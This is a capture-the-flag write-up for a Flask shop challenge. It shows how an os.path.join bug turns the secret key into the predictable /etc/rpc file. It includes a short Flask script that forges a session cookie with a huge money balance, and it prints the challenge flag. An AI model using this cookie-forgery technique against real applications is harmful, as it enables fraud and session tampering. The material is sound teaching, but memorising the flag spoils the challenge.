# Writeup for shop-1

In this challenge the goal is to buy a flag from the shop. The only problem is that we don't have enough money...

This app sets up something when starting up:

```python
...
app = Flask('EPT-Shop')
confdir = os.path.join('/app/', app.name, '/etc/')
if not os.path.exists(confdir):
    os.makedirs(confdir)
    random_process_context = random.choices(string.ascii_letters + string.digits, k=16)
    open(os.path.join(confdir, 'rpc'), 'w').write(random_process_context)

app.secret_key = open(os.path.join(confdir, 'rpc')).read()
...
```

If the folder `/app/EPT-Shop/etc/` does not exist, it creates it and stores a random value inside the file `/app/EPT-Shop/etc/rpc`.
This value is then used as the Flask SECRET_KEY.

There is a bug in the `os.path.join`-part of the code here. If you try to run `os.path.join('/app/', 'test', '/etc/')` in Python, it returns
`/etc/` instead of `/app/test/etc/`. This is because you are not supposed to have any string starting with `/` in `os.path.join`. 
If a string starts with `/` then `os.path.join` puts it as first in the result string.

`/etc/rpc` is actually a file that exists on Linux, and this now gets used as the secret key. Now that we know what the secret key is, we can craft our own
session cookie that has a lot of money, since the money is stored in the user session.

In order to solve this challenge I created my own Flask program that uses the `/etc/rpc` file as SECRET. Use the rpc-file from `ubuntu:22.04` docker
so you're sure you use the exact same file as the server.

```python
from flask import Flask, request, make_response, redirect, render_template, send_from_directory, session
import random
import string
import os

app = Flask('hacked')
app.secret_key = open('/etc/rpc').read()

@app.route('/', defaults={'path': 'index.html'})
@app.route('/<path:path>')
def static_files(path):
    session['money'] = 9999999
    if path == 'index.html':
        return render_template('index.html', items=items, money=session['money'])
    return send_from_directory('static', path)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

Visit the website and copy this cookie to the challenge website and buy the flag!

Flag: `EPT{J0in1ng_p4th5_1s_h4rd_C4n_1_j0in_y0u_1nst3ad_<3?}`
